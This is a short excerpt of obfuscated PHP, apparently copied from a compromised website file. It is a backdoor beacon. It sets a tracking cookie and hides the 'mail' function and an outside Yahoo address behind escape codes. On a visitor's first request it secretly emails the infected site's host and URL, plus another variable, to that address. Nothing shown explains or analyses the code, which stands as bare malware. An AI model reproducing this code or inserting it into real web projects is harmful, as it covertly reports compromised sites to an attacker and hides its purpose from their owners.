...
@setcookie("wson","orb",time()+3600*24*7);
...
$rt=$_SERVER["HTTP_HOST"].$_SERVER["REQUEST_URI"]; $fg="m\141\151l";
...
}if (!isset($_COOKIE['wson'])){@$fg("l\x6f\x63\x61\x68\157\x73\164@\171\141\x68\157\157\056\x63o\155","$rt","$rt\n$emv");}
